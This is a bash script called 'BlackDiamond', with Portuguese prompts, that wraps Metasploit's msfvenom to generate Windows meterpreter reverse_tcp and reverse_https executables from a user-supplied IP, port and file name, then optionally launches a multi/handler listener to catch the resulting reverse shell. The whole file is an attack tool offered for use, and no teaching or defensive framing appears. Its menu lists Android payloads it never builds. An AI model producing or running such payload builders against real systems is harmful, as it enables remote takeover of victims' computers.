#!/bin/bash
#Created By HiSecurity


echo "▀█████████▄   ▄█          ▄████████  ▄████████    ▄█   ▄█▄      ████████▄   ▄█     ▄████████   ▄▄▄▄███▄▄▄▄    ▄██████▄  ███▄▄▄▄   ████████"▄
sleep 0.1
echo "  ███    ███ ███         ███    ███ ███    ███   ███ ▄███▀      ███   ▀███ ███    ███    ███ ▄██▀▀▀███▀▀▀██▄ ███    ███ ███▀▀▀██▄ ███ ▀██"
sleep 0.1 
echo "███    ███ ███         ███    ███ ███    █▀    ███▐██▀        ███    ███ ███▌   ███    ███ ███   ███   ███ ███    ███ ███   ███ ███    ███"
sleep 0.1
echo "▄███▄▄▄██▀  ███         ███    ███ ███         ▄█████▀         ███    ███ ███▌   ███    ███ ███   ███   ███ ███    ███ ███   ███ ███    ██"
sleep 0.1 
echo "▀▀███▀▀▀██▄  ███       ▀███████████ ███        ▀▀█████▄         ███    ███ ███▌ ▀███████████ ███   ███   ███ ███    ███ ███   ███ ███    ███"
sleep 0.1
echo "  ███    ██▄ ███         ███    ███ ███    █▄    ███▐██▄        ███    ███ ███    ███    ███ ███   ███   ███ ███    ███ ███   ███ ███    █"
sleep 0.1
echo " ███    ███ ███▌    ▄   ███    ███ ███    ███   ███ ▀███▄      ███   ▄███ ███    ███    ███ ███   ███   ███ ███    ███ ███   ███ ███   ▄███"
sleep 0.1
echo "▄█████████▀  █████▄▄██   ███    █▀  ████████▀    ███   ▀█▀      ████████▀  █▀     ███    █▀   ▀█   ███   █▀   ▀██████▀   ▀█   █▀  ████████▀"

echo ""
echo ""
msfvenom="/usr/share/metasploit-framework"
if [ -e $msfvenom ]
	then
		echo "Metasploit encontrado, continuando..."
	else
		echo "Metasploit nao encontrado, bye..!" ; exit 0
fi

echo ""
echo "|==============BlackDiamond - WINDOWS==============|"
echo "|						          |"
echo "| [1] windows/meterpreter/reverse_tcp		  |"
echo "| [2] windows/meterpreter/reverse_https		  |"
echo "| [3] windows/meterpreter/reverse_tcp_dns		  |"
echo "|==============BlackDiamond - Android==============|"
echo "|							 |"
echo "| [4] android/meterpreter/reverse_tcp		 |"
echo "| [5] android/meterpreter/reverse_https		 |"
echo "| [6] android/meterpreter/reverse_tcp_dns		 |"
echo "| 						 |"
echo "|==================================================|"

echo ""
echo ""
echo -e "\033[0;34m DIGITE O NUMERO DO PAYLOAD: " 
echo -ne "\033[0;36m blackdiamond > \033[0;35m" && read payload
if [ $payload -lt 1 ]
	then
		echo "Payload não existe" ; exit 0
elif [ $payload -gt 5 ]
	then
		echo "Payload não existe" ; exit 0
fi

echo ""
echo -e "\033[0;34m DIGITE SEU IP INTERNO OU EXTERNO: "
echo -ne "\033[0;36m blackdiamond > \033[0;35m" && read ip
echo ""
echo -e "\033[0;34m DIGITE A PORTA QUE IRAR UTILIZAR! "
echo -ne "\033[0;36m blackdiamond > \033[0;35m" && read porta
echo ""
echo -e "\033[0;34m DIGITE O NOME DO PAYLOAD! "
echo -ne "\033[0;36m blackdiamond > \033[0;35m" && read arquivo
echo ""
echo ""

if [ $payload -eq 1 ]
	then
	clear
		echo "CRIANDO SEU PAYLOAD..." ; msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > $arquivo.exe 2>/dev/null
		payload="windows/meterpreter/reverse_tcp"
elif [ $payload -eq 2 ]
	then
		echo "CRIANDO SEU PAYLOAD..." ; msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$porta -f exe > $arquivo.exe 2>/dev/null
fi

echo ""
echo ""
echo -e "\033[0;31m PAYLOAD CRIADO COM SUCESSO!  \033[0m"
echo -e "\033[0;34m DESEJA CONFIGURAR SESSAO HANDLER? [s/n]  \033[0m"
echo -ne "\033[0;34m blackdiamond >  \033[0m" && read resposta
echo ""
echo ""
if [ $resposta == "s" ]
	then
		msfconsole -q -x "use multi/handler ; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $porta ; exploit"
elif [ $resposta == "n" ]
	then
		echo "Obrigado por usar nosso script!"
		exit 0
elif [ $resposta != "s" ]
	then
		echo "Resposta invalida!"
		exit 0
elif [ $resposta != "n" ]
	then
		echo "Resposta invalida!"
		exit 0
fi
